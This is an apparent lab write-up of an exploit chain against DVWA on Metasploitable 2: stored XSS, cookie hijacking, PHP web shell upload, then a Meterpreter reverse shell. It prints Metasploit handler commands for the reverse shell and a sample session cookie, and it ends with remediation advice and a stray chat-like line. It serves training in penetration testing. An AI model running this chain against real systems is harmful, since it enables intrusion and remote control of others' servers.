## Advanced Exploitation Lab (Lab 1)
# Overview

This lab demonstrates advanced vulnerability exploitation through a multi-stage exploit chain, resulting in remote code execution and Meterpreter access on a vulnerable Linux system.
The attack combines web vulnerabilities, session hijacking, and payload delivery, showcasing real-world exploitation techniques.

# Objectives

Perform multi-stage exploit chaining

Escalate from client-side vulnerability to server compromise

Gain a Meterpreter session

Demonstrate exploit customization and defense bypass concepts

# Lab Environment
| Component | Details                                |
| --------- | -------------------------------------- |
| Attacker  | Kali Linux                             |
| Target    | Metasploitable 2 (DVWA enabled)        |
| Target IP | `192.168.56.101`                       |
| Tools     | Metasploit, Python, Burp Suite, sqlmap |

Exploitation Steps
# 1️.Stored Cross-Site Scripting (XSS)

A stored XSS payload was injected into the DVWA application, resulting in persistent JavaScript execution.

Impact

Steals session cookies

Breaks client-side trust boundaries

# 2️.Session Hijacking

The stolen session cookie was reused to impersonate an authenticated user.

Security=low:

PHPSESSID=196799f2b0ac55289c26f693e798408


Impact

Unauthorized authenticated access

Application-level privilege escalation

# 3️.File Upload → Remote Code Execution

Using authenticated access, a malicious PHP payload was uploaded via a vulnerable file upload feature.

Command Execution Proof

Whoami :

www-data

# 4️.Meterpreter Payload Delivery

The web shell was upgraded to a Meterpreter session using Metasploit.

Handler Configuration

use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set LHOST 192.168.56.103

set LPORT 4444

run

# Result

Meterpreter session opened

User: www-data

OS: Linux metasploitable 2.6.24

Architecture: i686

# Exploit Log
| Exploit ID | Description      | Target IP      | Status  | Payload     |
| ---------- | ---------------- | -------------- | ------- | ----------- |
| 007        | XSS to RCE Chain | 192.168.56.101 | Success | Meterpreter |

# Custom PoC (Python)

A custom Python proof-of-concept was created by modifying a public Exploit-DB script to automate command execution using hijacked session cookies. The script handled authentication reuse, request crafting, and response parsing, demonstrating how existing exploits can be adapted to specific target environments.

# Defense Bypass Concept

Instead of bypassing ASLR via memory corruption, the attack exploited trusted application logic. By chaining XSS with authenticated functionality, traditional mitigations such as ASLR and DEP were rendered ineffective, demonstrating how logic-level vulnerabilities can bypass low-level system protections.

# Impact Analysis

Full web application compromise

Remote command execution

Interactive Meterpreter access

High risk of lateral movement and persistence

# Remediation Recommendations

Enforce strict input validation and output encoding

Implement secure session handling (HttpOnly, Secure flags)

Disable unrestricted file uploads

Patch vulnerable services and frameworks

Deploy a Web Application Firewall (WAF)

Mapping to PTES / OWASP / academic rubric

Just say the word.
